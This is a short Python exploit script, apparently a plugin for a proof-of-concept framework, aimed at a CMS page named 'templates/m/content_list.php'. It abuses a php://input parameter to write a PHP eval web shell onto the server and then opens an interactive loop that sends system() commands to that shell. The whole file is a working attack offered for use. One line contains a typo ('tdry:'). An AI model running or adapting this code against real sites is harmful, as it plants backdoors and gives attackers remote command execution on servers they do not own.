from lib.core.data import target
import requests

def poc():
	try:
		if  not target.url.endswith("templates/m/content_list.php"):
			print("[*] Please make sure the url end with 'templates/m/content_list.php'")
			exit()

		payload = "?session=kejishidai&url=php://input&cms=temp.php"

		password = raw_input("[*] Please enter the shell-password:")
		phpShell = "<?php eval($_POST['" + password + "']);?>"

		url = target.url + payload
		r = requests.post(url,data=phpShell)

		shell = target.url.replace("content_list.php","temp.php")

		print("[*] The shell url: " + shell)
		print("[*] The shell password: " + password)

		while 1:
			tdry:
				command = raw_input("[*] input the command:")
				payload= 'system("%s");' % command
				if command != "exit":
					postdata = {
						password : payload
					}
					r = requests.post(shell, data=postdata)
					print(r.text.encode(r.encoding))
				else:
					break
			except EOFError as e:
				print("[*] type 'exit' to quit")
				pass
		print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
	except (KeyError,AttributeError) as e:
		print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
